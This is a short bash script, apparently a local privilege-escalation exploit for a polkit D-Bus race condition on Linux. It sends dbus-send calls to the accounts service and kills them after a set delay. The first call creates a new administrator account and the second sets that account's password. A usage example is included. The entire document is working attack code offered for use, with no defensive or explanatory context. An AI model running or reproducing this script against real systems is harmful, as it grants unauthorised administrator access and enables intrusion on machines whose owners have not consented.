#!/bin/bash

#$1 : Username
#$2 : Password
#$3 : Delay

#Example
#./exploit_create_user.sh jamesbond double0seven 0.015

#Create user
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$1 string:"International Spy" int32:1 & sleep $3 ; kill $!

#Check whether user has been created
id $1

#Generate hashed password and store it in variable 'PWD'
PWD=$(openssl passwd -5 $2)

#Set the password for user using variable 'PWD'
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:$PWD string:hackz & sleep $3 ; kill $!
